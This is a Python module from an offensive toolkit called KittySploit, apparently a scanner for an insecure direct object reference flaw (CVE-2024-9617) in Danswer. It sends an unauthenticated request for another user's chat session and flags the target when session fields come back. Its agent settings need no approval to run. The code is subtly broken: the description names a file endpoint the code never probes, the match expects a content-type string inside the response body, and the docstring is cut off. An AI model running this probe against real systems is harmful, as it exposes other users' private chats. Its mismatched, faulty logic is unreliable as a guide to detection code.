#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The application does not verify whether the attacker is the creator of the file, allowing the attacker to dire."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Danswer - Insecure Direct Object Reference Detection',
        'description': "The application does not verify whether the attacker is the creator of the file, allowing the attacker to directly call the GET /api/chat/file/{file_id} interface to view any user's file.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2024', 'danswer', 'idor', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://huntr.com/bounties/8f683ff6-3a99-41c6-b763-a8f7b73bd146',
            'https://github.com/danswer-ai/danswer',
        ],
        'cve': 'CVE-2024-9617',
    }

    def run(self):
        r = self.http_request(method="GET", path='/api/chat/get-chat-session/1?is_shared=True', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('application/json',)
        body_all = ('chat_session_id', 'description', 'persona_id',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="Danswer - Insecure Direct Object Reference detected",
                path='/api/chat/get-chat-session/1?is_shared=True',
            )
            return True
        return False

